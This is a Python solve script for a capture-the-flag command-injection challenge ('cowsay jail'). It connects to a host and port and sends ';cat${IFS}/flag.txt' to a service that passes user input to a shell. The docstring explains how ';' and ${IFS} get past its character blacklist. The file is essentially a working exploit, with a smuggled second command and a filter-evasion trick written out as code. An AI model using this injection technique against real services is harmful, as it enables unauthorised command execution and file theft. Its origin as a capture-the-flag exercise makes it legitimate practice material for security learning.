#!/usr/bin/env python3
"""cowsay jail - AlpacaHack Daily (misc/pyjail).
jail.py runs `cowsay {argument}` via shell=True, blocking space, '-', quotes,
parens and redirection/pipe chars, but NOT ';' or '$'. We inject a command
with ';' and replace spaces with ${IFS}:  ;cat${IFS}/flag.txt
Usage: python3 -I solve.py HOST PORT"""
import re, socket, sys
H, P = sys.argv[1], int(sys.argv[2])
payload = b";cat${IFS}/flag.txt\n"
s = socket.create_connection((H, P), timeout=20); s.settimeout(6)
buf = b""
try:
    while b"cowsay" not in buf:
        buf += s.recv(4096)
    s.sendall(payload)
    data = b""
    while True:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk: break
        data += chunk
finally:
    s.close()
text = data.decode(errors="replace")
m = re.search(r"Alpaca\{[^}]*\}", text)
print(m.group(0) if m else "[no flag]\n"+text)
